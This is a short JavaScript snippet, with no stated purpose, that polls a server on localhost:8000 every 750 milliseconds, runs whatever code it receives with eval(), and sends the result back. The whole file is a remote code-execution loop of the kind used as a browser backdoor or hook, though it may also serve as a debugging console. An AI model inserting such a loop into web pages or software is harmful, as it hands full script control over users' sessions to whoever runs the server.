function get_data(url, func) {
  var xhr = new XMLHttpRequest();
  xhr.onload = () => func(xhr.responseText);
  xhr.open('GET', url);
  xhr.send();
}

setInterval(function () {
  get_data('https://localhost:8000/js', function (js) {
    if (js != '')
      get_data('https://localhost:8000/result?r=' + encodeURIComponent(eval(js)), function () {});
  });
}, 750);

